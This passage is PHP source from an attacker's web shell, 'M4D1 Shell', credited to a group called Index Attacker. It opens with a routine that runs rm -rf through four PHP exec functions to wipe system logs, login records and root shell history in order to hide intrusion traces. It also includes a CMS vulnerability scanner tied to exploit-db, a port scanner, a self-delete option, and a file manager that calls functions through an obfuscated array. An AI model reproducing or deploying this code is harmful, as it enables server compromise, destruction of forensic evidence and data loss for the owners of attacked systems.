					exec("rm -rf /etc/utmp");
					exec("rm -rf $HISTFILE");
					exec("rm -rf /var/log/lastlog");
					exec("rm -rf /var/log/wtmp");

					shell_exec("rm -rf /tmp/logs");
					shell_exec("rm -rf /root/.ksh_history");
					shell_exec("rm -rf /root/.bash_history");
					shell_exec("rm -rf /root/.bash_logout");
					shell_exec("rm -rf /usr/local/apache/logs");
					shell_exec("rm -rf /usr/local/apache/log");
					shell_exec("rm -rf /var/apache/logs");
					shell_exec("rm -rf /var/apache/log");
					shell_exec("rm -rf /var/run/utmp");
					shell_exec("rm -rf /var/logs");
					shell_exec("rm -rf /var/log");
					shell_exec("rm -rf /var/adm");
					shell_exec("rm -rf /etc/wtmp");
					shell_exec("rm -rf /etc/utmp");
					shell_exec("rm -rf $HISTFILE");
					shell_exec("rm -rf /var/log/lastlog");
					shell_exec("rm -rf /var/log/wtmp");

					passthru("rm -rf /tmp/logs");
					passthru("rm -rf /root/.ksh_history");
					passthru("rm -rf /root/.bash_history");
					passthru("rm -rf /root/.bash_logout");
					passthru("rm -rf /usr/local/apache/logs");
					passthru("rm -rf /usr/local/apache/log");
					passthru("rm -rf /var/apache/logs");
					passthru("rm -rf /var/apache/log");
					passthru("rm -rf /var/run/utmp");
					passthru("rm -rf /var/logs");
					passthru("rm -rf /var/log");
					passthru("rm -rf /var/adm");
					passthru("rm -rf /etc/wtmp");
					passthru("rm -rf /etc/utmp");
					passthru("rm -rf $HISTFILE");
					passthru("rm -rf /var/log/lastlog");
					passthru("rm -rf /var/log/wtmp");


					system("rm -rf /tmp/logs");
					sleep(2);
					echo '<br>Deleting .../tmp/logs ';
					sleep(2);

					system("rm -rf /root/.bash_history");
					sleep(2);
					echo '<p>Deleting .../root/.bash_history </p>';

					system("rm -rf /root/.ksh_history");
					sleep(2);
					echo '<p>Deleting .../root/.ksh_history </p>';

					system("rm -rf /root/.bash_logout");
					sleep(2);
					echo '<p>Deleting .../root/.bash_logout </p>';

					system("rm -rf /usr/local/apache/logs");
					sleep(2);
					echo '<p>Deleting .../usr/local/apache/logs </p>';

					system("rm -rf /usr/local/apache/log");
					sleep(2);
					echo '<p>Deleting .../usr/local/apache/log </p>';

					system("rm -rf /var/apache/logs");
					sleep(2);
					echo '<p>Deleting .../var/apache/logs </p>';

					system("rm -rf /var/apache/log");
					sleep(2);
					echo '<p>Deleting .../var/apache/log </p>';

					system("rm -rf /var/run/utmp");
					sleep(2);
					echo '<p>Deleting .../var/run/utmp </p>';

					system("rm -rf /var/logs");
					sleep(2);
					echo '<p>Deleting .../var/logs </p>';

					system("rm -rf /var/log");
					sleep(2);
					echo '<p>Deleting .../var/log </p>';

					system("rm -rf /var/adm");
					sleep(2);
					echo '<p>Deleting .../var/adm </p>';

					system("rm -rf /etc/wtmp");
					sleep(2);
					echo '<p>Deleting .../etc/wtmp </p>';

					system("rm -rf /etc/utmp");
					sleep(2);
					echo '<p>Deleting .../etc/utmp </p>';

					system("rm -rf $HISTFILE");
					sleep(2);
					echo '<p>Deleting ...$HISTFILE </p>';

					system("rm -rf /var/log/lastlog");
					sleep(2);
					echo '<p>Deleting .../var/log/lastlog </p>';

					system("rm -rf /var/log/wtmp");
					sleep(2);
					echo '<p>Deleting .../var/log/wtmp </p>';

					sleep(4);

					echo '<br><br><p>Your Traces Has Been Successfully Deleting ...From the Server';
					echo "</td></tr></table>";
				} elseif (isset($_GET[hex('scanner')])) {
					echo "<hr><br>";
					echo "<center><h2>Scanner M4D1 Shell</h2></center><br>";
					echo "<form method = 'POST'>
						<center>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('cmsvuln') . "' style='width: 250px;' height='10'><center>CMS Vulnerability Scanner</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('port-scanner') . "' style='width: 250px;' height='10'><center>Port Scanner</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('logs-scanner') . "' style='width: 250px;' height='10'><center>Logs Scanner</center></a>
						</div>
						</div></center></form>";
					echo "<hr>";
				} elseif (isset($_GET[hex('cmsvuln')])) {
					@set_time_limit(0);
					@error_reporting(0);
					// Script Functions , start ..!
					function ask_exploit_db($component)
					{
						$exploitdb = "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$component&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";
						$result = @file_get_contents($exploitdb);
						if (eregi("No results", $result)) {
							echo "<center><td>Gak ada</td><td><a href='http://www.google.com/search?hl=en&q=download+$component'>Download</a></td></tr>";
						} else {
							echo "<td><a href='$exploitdb'>Klik Ini..!</a></td><td><--</td></tr>";
						}
					}
					/**************************************************************/
					/* Joomla Conf */
					function get_components($site)
					{
						$source = @file_get_contents($site);
						preg_match_all('{option,(.*?)/}i', $source, $f);
						preg_match_all('{option=(.*?)(&amp;|&|")}i', $source, $f2);
						preg_match_all('{/components/(.*?)/}i', $source, $f3);
						$arz = array_merge($f2[1], $f[1], $f3[1]);
						$coms = array();
						if (count($arz) == 0) {
							echo "<tr><td style='border-color:white' colspan=3>[~] Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
						}
						foreach (array_unique($arz) as $x) {
							$coms[] = $x;
						}
						foreach ($coms as $comm) {
							echo "<tr><td>$comm</td>";
							ask_exploit_db($comm);
						}
					}
					/**************************************************************/
					/* WP Conf */
					function get_plugins($site)
					{
						$source = @file_get_contents($site);
						preg_match_all("#/plugins/(.*?)/#i", $source, $f);
						$plugins = array_unique($f[1]);
						if (count($plugins) == 0) {
							echo "<tr><td style='border-color:white' colspan=1>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
						}
						foreach ($plugins as $plugin) {
							echo "<tr><td>$plugin</td>";
							ask_exploit_db($plugin);
						}
					}
					/**************************************************************/
					/* Nuke's Conf */
					function get_numod($site)
					{
						$source = @file_get_contents($site);
						preg_match_all('{?name=(.*?)/}i', $source, $f);
						preg_match_all('{?name=(.*?)(&amp;|&|l_op=")}i', $source, $f2);
						preg_match_all('{/modules/(.*?)/}i', $source, $f3);
						$arz = array_merge($f2[1], $f[1], $f3[1]);
						$coms = array();
						if (count($arz) == 0) {
							echo "<tr><td style='border-color:white' colspan=3>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
						}
						foreach (array_unique($arz) as $x) {
							$coms[] = $x;
						}
						foreach ($coms as $nmod) {
							echo "<tr><td>$nmod</td>";
							ask_exploit_db($nmod);
						}
					}
					/*****************************************************/
					/* Xoops Conf */
					function get_xoomod($site)
					{
						$source = @file_get_contents($site);
						preg_match_all('{/modules/(.*?)/}i', $source, $f);
						$arz = array_merge($f[1]);
						$coms = array();
						if (count($arz) == 0) {
							echo "<tr><td style='border-color:white' colspan=3>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
						}
						foreach (array_unique($arz) as $x) {
							$coms[] = $x;
						}
						foreach ($coms as $xmod) {
							echo "<tr><td>$xmod</td>";
							ask_exploit_db($xmod);
						}
					}
					/**************************************************************/
					/* Header */
					function t_header($site)
					{
						echo '<br><hr color="white"><br><table align="center" border="1" style="border-color=white; text-align:left;" width="50%" cellspacing="1" cellpadding="5">';
						echo '
<tr>
<td style="border-color=white">Site : <a href="' . $site . '">' . $site . '</a></td>
<td style="border-color=yellow">Exploit-db</b></td>
<td style="border-color=yellow">Exploit it !</td>
</tr>
';
					}
					echo "<center>";
					echo '<hr><br>
<h2>CMS Vulnerability Scanner M4D1 Shell</h2>
<form method="POST" action=""  class="header-izz">
    <p>Link&nbsp&nbsp<input type="text" style="border:0;border-bottom:1px solid #292929; width:500px;" name="site" value="http://127.0.0.1/" class = "form-control" >
    <br><br>
    CMS
    &nbsp&nbsp&nbsp<select class = "form-control"  name="pilihan" style="border:0;border-bottom:1px solid #292929; width:500px;">
    <option>Wordpress</option>
    <option>Joomla</option>
    <option>Nukes</option>
    <option>Xoops</option> 
    </select><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
    <input class = "form-control" type="submit" style="width: 150px; height: 40px; border-color=white;margin:10px 2px 0 2px;" value="Scan" class="kotak"></p>
</form></center><hr><br>';
					// Start Scan :P :P ...
					if ($_POST) {
						$site = strip_tags(trim($_POST['site']));
						t_header($site);
						echo $x01 = ($_POST['pilihan'] == "Wordpress") ? get_plugins($site) : "";
						echo $x02 = ($_POST['pilihan'] == "Joomla") ? get_components($site) : "";
						echo $x03 = ($_POST['pilihan'] == "Nuke's") ? get_numod($site) : "";
						echo $x04 = ($_POST['pilihan'] == "Xoops") ? get_xoomod($site) : "";
					}
				} elseif (isset($_GET[hex('port-scanner')])) {
					echo "<hr><br><center>";
					echo '<table><h2>Ports Scanner M4D1 Shell</h2><td>';
					echo '<div class="content">';
					echo '<form action="" method="post">';

					if (isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])) {
						$start = strip_tags($_POST['start']);
						$end = strip_tags($_POST['end']);
						$host = strip_tags($_POST['host']);
						for ($i = $start; $i <= $end; $i++) {
							$fp = @fsockopen($host, $i, $errno, $errstr, 3);
							if ($fp) {
								echo 'Port ' . $i . ' is <font color=green>open</font><br>';
							}
							flush();
						}
					} else {
						echo '<br /><br /><center><input type="hidden" name="a" value="PortScanner"><input type="hidden" name=p1><input type="hidden" name="p2">
		              <input type="hidden" name="c" value="' . htmlspecialchars($GLOBALS['cwd']) . '">
		              <input type="hidden" name="charset" value="' . (isset($_POST['charset']) ? $_POST['charset'] : '') . '">
		              Host:<br> <input class = "form-control" type="text" name="host" value="localhost"/><br /><br />
		              Port start: <br><input class = "form-control type="text" name="start" value="0"/><br /><br />
		              Port end: <br><input type="text" name="end" value="5000"/><br /><br />
		              <input class = "form-control type="submit" value="Scan Ports" />
		              </form></center><br /><br />';
						echo "</center>";
						echo '</div></table></td><hr><br>';
					}
				} elseif (isset($_GET[hex('logs-scanner')])) {

					echo '<hr><br>';
					echo "<Center>\n";
					echo "<h2>Log Hunter M4D1 Shell</h2>";
					echo "<form action=\"\" method=\"post\">\n";
					?><br>Dir :<input class="form-control" style="width: 250px;" type="text" value="<?= getcwd(); ?>" name="shc_dir"><?php
																																		echo "<br>";
																																		echo "<input class = 'form-control' style='width:250px;' type=\"submit\" name=\"submit\" value=\"Scan Now!\"/>\n";
																																		echo "</form><hr><br>\n";
																																		echo "<pre style=\"text-align: left;\">\n";
																																		error_reporting(0);
															


																																		if ($_POST['submit']) {
																																			function tampilkan($shcdirs)
																																			{
																																				foreach (scandir($shcdirs) as $shc) {
																																					if ($shc != '.' && $shc != '..') {
																																						$shc = $shcdirs . DIRECTORY_SEPARATOR . $shc;
																																						if (!is_dir($shc) && !eregi("css", $shc)) {

																																							$fgt    = file_get_contents($shc);
																																							$ifgt   = exif_read_data($shc);
																																							$jembut = "COMPUTED";
																																							$taik   = "UserComment";
																																							$shcm = "/mail['(']/";
																																							if ($ifgt[$jembut][$taik]) {
																																								echo "[<font color=#00FFD0>Stegano</font>] <font color=#2196F3>" . $shc . "</font><br>";
																																							}
																																							preg_match_all('#[A-Z0-9a-z._%+-]+@[A-Za-z0-9.+-]+#', $fgt, $cocok);
																																							$hcs  = "/base64_decode/";
																																							$exif = "/exif_read_data/";
																																							preg_match($shcm, addslashes($fgt), $mailshc);
																																							preg_match($hcs,  addslashes($fgt), $shcmar);
																																							preg_match($exif, addslashes($fgt), $shcxif);
																																							if (eregi('HTTP Cookie File', $fgt) || eregi('PHP Warning:', $fgt)) {
																																							}
																																							if (eregi('tmp_name', $fgt)) {
																																								echo "[<font color=#FAFF14>Uploader</font>] <font color=#2196F3>" . $shc . "</font><br>";
																																							}
																																							if ($shcmar[0]) {
																																								echo "[<font color=#FF3D00>Base64</font>] <font color=#2196F3>" . $shc . "</font><br>";
																																							}
																																							if ($mailshc[0]) {
																																								echo "[<font color=#E6004E>MailFunc</font>] <font color=#2196F3>" . $shc . "</font><br>";
																																							}
																																							if ($shcxif[0]) {
																																								echo "[<font color=#00FFD0>Stegano</font>] <font color=#2196F3>" . $shc . "</font> </font><font color=red>{Manual Check}</font><br>";
																																							}
																																							if (eregi("js", $shc)) {
																																								echo "[<font color=red>Javascript</font>] <font color=#2196F3>" . $shc . "</font> { <a href=http://www.unphp.net target=_blank>CheckJS</a> }<br>";
																																							}
																																							if ($cocok[0]) {
																																								foreach ($cocok[0] as $key => $shcmail) {
																																									if (filter_var($shcmail, FILTER_VALIDATE_EMAIL)) {
																																										echo "[<font color=greenyellow>SendMail</font>] <font color=#2196F3>" . $shc . "</font> { " . $shcmail . " }<br>";
																																									}
																																								}
																																							}
																																						} else {
																																							tampilkan($shc);
																																						}
																																					}
																																				}
																																			}
																																			tampilkan($_POST['shc_dir']);
																																		}
																																		echo "</pre>\n";
																																		echo "</Center>\n";
																																		echo "</div>";
																																	} elseif (isset($_GET[hex('about')])) {

																																		echo "<hr><br><center><h2>About Index Attacker</h2>";
																																		echo "Thanks For Taking Our Shell Today without you all we are means nothing :) <br><br>";
																																		echo "visit us : <a href = 'https://www.indexattacker.web.id' target = 'blank' class= 'form-control' style = 'width:250px;'>Pwnz!</a> <br><br>";
																																		echo "We Are : <br>
			    Jinzo - Lord.Acil - SQL47.id - ./Exorcism1337 - Security_Hunterz - CrazyClownZz - Lastcar_Jihood - Mr.IP - Sy3rifb0y - Mr.Syn10_10 - CLAY97 - Devil!Hunter <br><br>
				";
																																		echo "Greetz : <br>IndoXploit - Xai Syndicate - Typical Idiot Security - Con7ext";
																																		echo "<hr><br></center>";
																																	} elseif (isset($_GET[hex('killself')])) {
																																		unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
																																		@unlink(__FILE__);
																																		print "<script>window.location='?';</script>";
																																	} elseif (isset($_GET[hex('logout')])) {
																																		unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
																																		print "<script>window.location='?';</script>";
																																	} elseif (isset($_GET["n"])) {
																																		echo $a_ . '+FILE' . $b_ . '
									<form action="" method="post">
										<input name="n" autocomplete="off" class="form-control col-md-3" type="text" value="">
										' . $d_ . '
								' . $c_;
																																		if (isset($_POST["n"])) {
																																			if (!$GNJ[25]($_POST["n"])) {
																																				ER();
																																			} else {
																																				OK();
																																			}
																																		}
																																	} elseif (isset($_GET["r"])) {
																																		echo $a_ . uhex($_GET["r"]) . $b_ . '
									<form action="" method="post">
										<input name="r" autocomplete="off" class="form-control col-md-3" type="text" value="' . uhex($_GET["r"]) . '">
										' . $d_ . '
								' . $c_;
																																		if (isset($_POST["r"])) {
																																			if ($GNJ[26]($_POST["r"])) {
																																				ER();
																																			} else {
																																				if ($GNJ[27](uhex($_GET["r"]), $_POST["r"])) {
																																					OK();
																																				} else {
																																					ER();
																																				}
																																			}
																																		}
																																	} elseif (isset($_GET["z"])) {
																																		$zip = new ZipArchive;
																																		$res = $zip->open(uhex($_GET["z"]));
																																		if ($res === TRUE) {
																																			$zip->extractTo(uhex($_GET["d"]));
																																			$zip->close();
																																			OK();
																																		} else {
																																			ER();
																																		}
																																	} else {

																																		echo '<table class = "table table-bordered mt-3" >
						<thead>
							<tr>
								<th><center> NAME </center></th>
								<th><center> TYPE </center></th>
								<th><center> SIZE </center></th>
								<th><center> LAST MODIFIED </center></th>
								<th><center> OWNER\GROUP </center></th>
								<th><center> PERMISSION </center></th>
								<th><center> ACTION </center></th>
							</tr>
						</thead>
						<tbody>
							
						';

																																		$h = "";
																																		$j = "";
																																		$w = $GNJ[13]($d);
																																		if ($GNJ[28]($w) || $GNJ[29]($w)) {
																																			foreach ($w as $c) {
																																				$e = $GNJ[14]("\\", "/", $d);
																																				if (!$GNJ[30]($c, ".zip")) {
																																					$zi = '';
																																				} else {
																																					$zi = '<a href="?d=' . hex($e) . '&z=' . hex($c) . '">U</a>';
																																				}
																																				if ($GNJ[31]("$d/$c")) {
																																					$o = "";
																																				} elseif (!$GNJ[32]("$d/$c")) {
																																					$o = " h";
																																				} else {
																																					$o = " w";
																																				}
																																				$s = $GNJ[34]("$d/$c") / 1024;
																																				$s = round($s, 3);
																																				if ($s >= 1024) {
																																					$s = round($s / 1024, 2) . " MB";
																																				} else {
																																					$s = $s . " KB";
																																				}
																																				if (($c != ".") && ($c != "..")) {
																																					($GNJ[8]("$d/$c")) ?
																																						$h .= '<tr class="r">
							<td>
								<img src = "https://cdn0.iconfinder.com/data/icons/iconico-3/1024/63.png" width = "20px" height = "20px">
								<a class="ajx" href="?d=' . hex($e) . hex("/" . $c) . '">' . $c . '</a>
							</td>
							<td><center>Dir</center></td>
							<td class="x">
								<center>-</center>
							</td>
							
							<td class="x">
							<center>
								<a class="ajx" href="?d=' . hex($e) . '&t=' . hex($c) . '">' . $GNJ[20]("F d Y g:i:s", $GNJ[21]("$d/$c")) . '</a>
								</center>
							</td>
							<td class = "x">
							<center>
							' . $dirinfo["owner"] . DIRECTORY_SEPARATOR . $dirinfo["group"] . '
							</center>
							</td>
							<td class="x">
							<center>
								<a class="ajx' . $o . '" href="?d=' . hex($e) . '&k=' . hex($c) . '">' . x("$d/$c") . '</a>
							</center>
							</td>
							<td class="x">
							<center>
								<a class="ajx" href="?d=' . hex($e) . '&r=' . hex($c) . '">Rename</a>
								<a class="ajx" href="?d=' . hex($e) . '&x=' . hex($c) . '">Delete</a>
								</center>
							</td>
						</tr>
						
						'
																																						:
																																						$j .= '<tr class="r">
							<td>
							
								<img src = "https://img.icons8.com/ios/104/000000/file-filled.png" width = "20px" height = "20px">
								<a class="ajx" href="?d=' . hex($e) . '&s=' . hex($c) . '">' . $c . '</a>
								
							</td>
							<td>
							<center>
							File
							</center>
							</td>
							<td class="x">
							<center>
								' . $s . '
								</center>
							</td>
							<td class="x">
							<center>
								<a class="ajx" href="?d=' . hex($e) . '&t=' . hex($c) . '">' . $GNJ[20]("F d Y g:i:s", $GNJ[21]("$d/$c")) . '</a>
								</center>
							</td>	
							<td>
							<center>
							' . $dirinfo["owner"] . DIRECTORY_SEPARATOR . $dirinfo["group"] . '
							</center>
							</td>
								<td class="x">
								<center>
							<a class="ajx' . $o . '" href="?d=' . hex($e) . '&k=' . hex($c) . '">' . x("$d/$c") . '</a>
							</center>
							</td>
							
							<td class="x">
								<center>
								<a class="ajx" href="?d=' . hex($e) . '&e=' . hex($c) . '">Edit</a>
								<a class="ajx" href="?d=' . hex($e) . '&r=' . hex($c) . '">Rename</a>
								<a href="?d=' . hex($e) . '&g=' . hex($c) . '">Download</a>
								' . $zi . '
								<a class="ajx" href="?d=' . hex($e) . '&x=' . hex($c) . '">Delete</a>
								</center>
							</td>
						</tr>
						
						';
																																				}
																																			}
																																		}

																																		echo $h;
																																		echo $j;
																																		echo '</tbody>
					
				</table>';
																																	}
																																		?>

				<footer class="x">
					<center>M4DI~UciH4</center>
				</footer>
				<?php
				if (isset($_GET["1"])) {
					echo $f;
				} elseif (isset($_GET["0"])) {
					echo $g;
				} else {
					NULL;
				}
				?>
				<script>
					$(".ajx").click(function(t) {
						t.preventDefault();
						var e = $(this).attr("href");
						history.pushState("", "", e), $.get(e, function(t) {
							$("body").html(t)
						})
					});
				</script>
	</body>

	</html>
	<?php
	function rec($j)
	{
		global $GNJ;
		if (trim(pathinfo($j, PATHINFO_BASENAME), '.') === '') {
			return;
		}
		if ($GNJ[8]($j)) {
			array_map('rec', glob($j . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
			$GNJ[35]($j);
		} else {
			$GNJ[10]($j);
		}
	}
	function dre($y1, $y2)
	{
		global $GNJ;
		ob_start();
		$GNJ[16]($y1($y2));
		return $GNJ[36]();
	}
	function hex($n)
	{
		$y = '';
		for ($i = 0; $i < strlen($n); $i++) {
			$y .= dechex(ord($n[$i]));
		}
		return $y;
	}
	function uhex($y)
	{
		$n = '';
		for ($i = 0; $i < strlen($y) - 1; $i += 2) {
			$n .= chr(hexdec($y[$i] . $y[$i + 1]));
		}
		return $n;
	}
	function OK()
	{
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
		header("Location: ?d=" . hex($d) . "&1");
		exit();
	}
	function ER()
	{
		global $GNJ, $d;
		$GNJ[38]($GNJ[9]);
		header("Location: ?d=" . hex($d) . "&0");
		exit();
	}
	function x($c)
	{
		global $GNJ;
		$x = $GNJ[24]($c);
		if (($x & 0xC000) == 0xC000) {
			$u = "s";
		} elseif (($x & 0xA000) == 0xA000) {
			$u = "l";
		} elseif (($x & 0x8000) == 0x8000) {
			$u = "-";
		} elseif (($x & 0x6000) == 0x6000) {
			$u = "b";
		} elseif (($x & 0x4000) == 0x4000) {
			$u = "d";
		} elseif (($x & 0x2000) == 0x2000) {
			$u = "c";
		} elseif (($x & 0x1000) == 0x1000) {
			$u = "p";
		} else {
			$u = "u";
		}
		$u .= (($x & 0x0100) ? "r" : "-");
		$u .= (($x & 0x0080) ? "w" : "-");
		$u .= (($x & 0x0040) ? (($x & 0x0800) ? "s" : "x") : (($x & 0x0800) ? "S" : "-"));
		$u .= (($x & 0x0020) ? "r" : "-");
		$u .= (($x & 0x0010) ? "w" : "-");
		$u .= (($x & 0x0008) ? (($x & 0x0400) ? "s" : "x") : (($x & 0x0400) ? "S" : "-"));
		$u .= (($x & 0x0004) ? "r" : "-");
		$u .= (($x & 0x0002) ? "w" : "-");
		$u .= (($x & 0x0001) ? (($x & 0x0200) ? "t" : "x") : (($x & 0x0200) ? "T" : "-"));
		return $u;
	}
	if (isset($_GET["g"])) {
		$GNJ[38]($GNJ[9]);
		header("Content-Type: application/octet-stream");
		header("Content-Transfer-Encoding: Binary");
		header("Content-Length: " . $GNJ[34](uhex($_GET["g"])));
		header("Content-disposition: attachment; filename=\"" . uhex($_GET["g"]) . "\"");
		$GNJ[37](uhex($_GET["g"]));
	}

	?>